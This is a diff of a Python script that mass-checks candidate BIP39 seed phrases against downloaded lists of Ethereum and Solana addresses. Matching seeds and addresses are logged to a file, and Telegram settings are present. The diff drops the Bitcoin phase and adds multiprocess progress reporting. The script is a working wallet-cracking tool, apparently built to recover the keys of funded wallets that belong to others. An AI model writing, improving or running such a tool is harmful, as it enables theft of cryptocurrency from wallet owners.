@@ -23,10 +23,6 @@ from bip_utils import (
     Bip44,
     Bip44Coins,
     Bip44Changes,
-    Bip49,
-    Bip49Coins,
-    Bip84,
-    Bip84Coins,
     Bip44Conf,
 )
 from supabase import create_client
@@ -36,15 +32,12 @@ Bip44Conf.ENABLE_UNSAFE_HDWALLET = True
 # ----------------------------------------------------------------------
 # Config
 # ----------------------------------------------------------------------
-BTC_FILE_ID = "1rysnhDGWd6OxtqbjHy-UEiDt6VDBsbAI"
 ETH_FILE_ID = "1G9CCyNnDoTxvQhqdQxYkbPG-HV2WN-Fx"
 SOL_FILE_ID = "1_ILIimHqOzws0Ld3IteMcH1_Rww9a-Ic"
 
-BTC_TXT = "btc_addresses.txt"
 ETH_TXT = "eth_addresses.txt"
 SOL_TXT = "sol_addresses.txt"
 
-BTC_DB = "btc_addresses.db"
 ETH_DB = "eth_addresses.db"
 SOL_DB = "sol_addresses.db"
 
@@ -57,8 +50,9 @@ ATOMIC_ID = 1
 TELEGRAM_MESSAGE_LIMIT = 4000
 NUM_WORKERS = 20
 STOP_CHECK_MASK = 0xFFF
+PROGRESS_BUMP_EVERY = 500
+MONITOR_INTERVAL = 30
 
-# SQLite page cache per worker connection. 20 workers × 100 MB = 2 GB.
 SQLITE_CACHE_KB = -100_000
 
 SOL_DERIVATION_PATH = "m/44'/501'/0'/0'"
@@ -66,6 +60,8 @@ SOL_DERIVATION_PATH = "m/44'/501'/0'/0'"
 SEEDS = []
 _STOP_EVENT = None
 _MATCH_LOCK = None
+_PHASE_COUNTER = None
+_PHASE_LOCK = None
 
 _telegram_bot_id = None
 _telegram_chat_id = None
@@ -311,37 +307,10 @@ class AddressChecker:
 # ----------------------------------------------------------------------
 # Derivation
 # ----------------------------------------------------------------------
-def derive_btc_addresses(seed_bytes):
-    results = []
-
-    try:
-        addr = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN) \
-            .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT) \
-            .AddressIndex(0).PublicKey().ToAddress()
-        results.append(("p2pkh", addr))
-    except Exception:
-        pass
-
-    try:
-        addr = Bip49.FromSeed(seed_bytes, Bip49Coins.BITCOIN) \
-            .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT) \
-            .AddressIndex(0).PublicKey().ToAddress()
-        results.append(("p2sh", addr))
-    except Exception:
-        pass
-
-    try:
-        addr = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN) \
-            .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT) \
-            .AddressIndex(0).PublicKey().ToAddress()
-        results.append(("bech32", addr))
-    except Exception:
-        pass
-
-    return results
-
-
 def derive_eth_address(seed_bytes):
+    """
+    BIP44 m/44'/60'/0'/0/0 -> Ethereum address (0x...)
+    """
     try:
         return Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM) \
             .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT) \
@@ -351,6 +320,9 @@ def derive_eth_address(seed_bytes):
 
 
 def derive_sol_address(seed_bytes):
+    """
+    Solana ed25519 (SLIP-0010) at m/44'/501'/0'/0'
+    """
     try:
         ctx = Bip32Slip10Ed25519.FromSeed(seed_bytes)
         derived = ctx.DerivePath(SOL_DERIVATION_PATH)
@@ -360,7 +332,15 @@ def derive_sol_address(seed_bytes):
 
 
 # ----------------------------------------------------------------------
-# Match recording (worker-safe — lock is shared via fork inheritance)
+# Progress helpers — plain mp primitives, inherited via fork
+# ----------------------------------------------------------------------
+def _bump(n):
+    with _PHASE_LOCK:
+        _PHASE_COUNTER.value += n
+
+
+# ----------------------------------------------------------------------
+# Match recording
 # ----------------------------------------------------------------------
 def _record_match(coin, seed, address, extra=None):
     record = {
@@ -372,7 +352,6 @@ def _record_match(coin, seed, address, extra=None):
     if extra:
         record["extra"] = extra
 
-    # Cross-process lock: matches are rare, so contention is negligible.
     with _MATCH_LOCK:
         try:
             with open(FOUND_FILE, "a", encoding="utf-8") as f:
@@ -387,34 +366,14 @@ def _record_match(coin, seed, address, extra=None):
 
 
 # ----------------------------------------------------------------------
-# Workers — derive + lookup in the same loop, no temp files
+# Workers
 # ----------------------------------------------------------------------
-def worker_btc(args):
-    worker_id, start_idx, count = args
-    checker = AddressChecker(BTC_DB)
-    matches = 0
-    try:
-        for offset in range(count):
-            if (offset & STOP_CHECK_MASK) == 0 and _STOP_EVENT.is_set():
-                break
-            seed = SEEDS[start_idx + offset]
-            try:
-                seed_bytes = Bip39SeedGenerator(seed).Generate()
-            except Exception:
-                continue
-            for addr_type, addr in derive_btc_addresses(seed_bytes):
-                if checker.contains(addr):
-                    _record_match("BTC", seed, addr, addr_type)
-                    matches += 1
-        return matches
-    finally:
-        checker.close()
-
-
 def worker_eth(args):
     worker_id, start_idx, count = args
     checker = AddressChecker(ETH_DB)
     matches = 0
+    since_bump = 0
+
     try:
         for offset in range(count):
             if (offset & STOP_CHECK_MASK) == 0 and _STOP_EVENT.is_set():
@@ -423,11 +382,24 @@ def worker_eth(args):
             try:
                 seed_bytes = Bip39SeedGenerator(seed).Generate()
             except Exception:
+                since_bump += 1
+                if since_bump >= PROGRESS_BUMP_EVERY:
+                    _bump(since_bump)
+                    since_bump = 0
                 continue
+
             addr = derive_eth_address(seed_bytes)
             if addr and checker.contains(addr):
                 _record_match("ETH", seed, addr)
                 matches += 1
+
+            since_bump += 1
+            if since_bump >= PROGRESS_BUMP_EVERY:
+                _bump(since_bump)
+                since_bump = 0
+
+        if since_bump:
+            _bump(since_bump)
         return matches
     finally:
         checker.close()
@@ -437,6 +409,8 @@ def worker_sol(args):
     worker_id, start_idx, count = args
     checker = AddressChecker(SOL_DB)
     matches = 0
+    since_bump = 0
+
     try:
         for offset in range(count):
             if (offset & STOP_CHECK_MASK) == 0 and _STOP_EVENT.is_set():
@@ -445,24 +419,40 @@ def worker_sol(args):
             try:
                 seed_bytes = Bip39SeedGenerator(seed).Generate()
             except Exception:
+                since_bump += 1
+                if since_bump >= PROGRESS_BUMP_EVERY:
+                    _bump(since_bump)
+                    since_bump = 0
                 continue
+
             addr = derive_sol_address(seed_bytes)
             if addr and checker.contains(addr):
                 _record_match("SOL", seed, addr)
                 matches += 1
+
+            since_bump += 1
+            if since_bump >= PROGRESS_BUMP_EVERY:
+                _bump(since_bump)
+                since_bump = 0
+
+        if since_bump:
+            _bump(since_bump)
         return matches
     finally:
         checker.close()
 
 
 # ----------------------------------------------------------------------
-# Phase runner
+# Phase runner — SIGALRM progress, no threads, no manager
 # ----------------------------------------------------------------------
 def run_phase(worker_fn, seeds, stop_event, coin):
-    global _STOP_EVENT, _MATCH_LOCK
+    global _STOP_EVENT, _MATCH_LOCK, _PHASE_COUNTER, _PHASE_LOCK
     _STOP_EVENT = stop_event
     if _MATCH_LOCK is None:
         _MATCH_LOCK = mp.Lock()
+
+    _PHASE_COUNTER = mp.Value("q", 0)
+    _PHASE_LOCK = mp.Lock()
 
     total = len(seeds)
     chunk = total // NUM_WORKERS
@@ -480,42 +470,56 @@ def run_phase(worker_fn, seeds, stop_event, coin):
     print(f"{coin}: {len(tasks)} workers over {total:,} seeds", flush=True)
 
     t0 = time.time()
+
+    def _alarm(signum, frame):
+        try:
+            cur = _PHASE_COUNTER.value
+        except Exception:
+            return
+        elapsed = time.time() - t0
+        rate = cur / elapsed if elapsed > 0 else 0
+        pct = 100.0 * cur / total if total else 0
+        eta = (total - cur) / rate if rate > 0 else 0
+        print(
+            f"  {coin}: {cur:,}/{total:,} ({pct:.1f}%) {rate:,.0f}/s  ETA {eta/3600:.2f}h",
+            flush=True,
+        )
+
+    old = signal.signal(signal.SIGALRM, _alarm)
+    signal.setitimer(signal.ITIMER_REAL, MONITOR_INTERVAL, MONITOR_INTERVAL)
+
     total_matches = 0
 
-    ctx = mp.get_context("fork")
-    with ProcessPoolExecutor(max_workers=NUM_WORKERS, mp_context=ctx) as executor:
-        futures = [executor.submit(worker_fn, t) for t in tasks]
-        try:
-            for fut in as_completed(futures):
-                try:
-                    total_matches += fut.result()
-                except Exception as e:
-                    print(f"{coin} worker error: {e}", flush=True)
-        except KeyboardInterrupt:
-            stop_event.set()
-            for fut in futures:
-                try:
-                    fut.result(timeout=10)
-                except Exception:
-                    pass
+    try:
+        ctx = mp.get_context("fork")
+        with ProcessPoolExecutor(max_workers=NUM_WORKERS, mp_context=ctx) as executor:
+            futures = [executor.submit(worker_fn, t) for t in tasks]
+            try:
+                for fut in as_completed(futures):
+                    try:
+                        total_matches += fut.result()
+                    except Exception as e:
+                        print(f"{coin} worker error: {e}", flush=True)
+            except KeyboardInterrupt:
+                stop_event.set()
+                for fut in futures:
+                    try:
+                        fut.result(timeout=10)
+                    except Exception:
+                        pass
+    finally:
+        signal.setitimer(signal.ITIMER_REAL, 0)
+        signal.signal(signal.SIGALRM, old)
 
     wall = time.time() - t0
     rate = total / wall if wall else 0
-    print(f"{coin}: {total:,} seeds in {wall:.0f}s ({rate:,.0f}/s), {total_matches} hits", flush=True)
-
+    print(f"{coin}: {total:,} in {wall:.0f}s ({rate:,.0f}/s), {total_matches} hits", flush=True)
     return total_matches
 
 
 # ----------------------------------------------------------------------
-# Phases — strictly sequential: BTC → ETH → SOL
+# Phases
 # ----------------------------------------------------------------------
-def process_btc(seeds, stop_event):
-    print("=== BTC phase ===", flush=True)
-    matches = run_phase(worker_btc, seeds, stop_event, "BTC")
-    print("=== BTC done ===", flush=True)
-    return matches
-
-
 def process_eth(seeds, stop_event):
     print("=== ETH phase ===", flush=True)
     matches = run_phase(worker_eth, seeds, stop_event, "ETH")
@@ -590,14 +594,11 @@ def main():
         print("ERROR: no valid_seeds.txt")
         sys.exit(1)
 
-    if not download_public_drive_file(BTC_FILE_ID, BTC_TXT, "btc"):
-        sys.exit(1)
     if not download_public_drive_file(ETH_FILE_ID, ETH_TXT, "eth"):
         sys.exit(1)
     if not download_public_drive_file(SOL_FILE_ID, SOL_TXT, "sol"):
         sys.exit(1)
 
-    build_sqlite_from_txt(BTC_TXT, BTC_DB, "btc")
     build_sqlite_from_txt(ETH_TXT, ETH_DB, "eth")
     build_sqlite_from_txt(SOL_TXT, SOL_DB, "sol")
 
@@ -622,11 +623,6 @@ def main():
     total_matches = 0
 
     try:
-        total_matches += process_btc(SEEDS, stop_event)
-        if stop_event.is_set():
-            print("stopped after BTC")
-            sys.exit(1)
-
         total_matches += process_eth(SEEDS, stop_event)
         if stop_event.is_set():
             print("stopped after ETH")
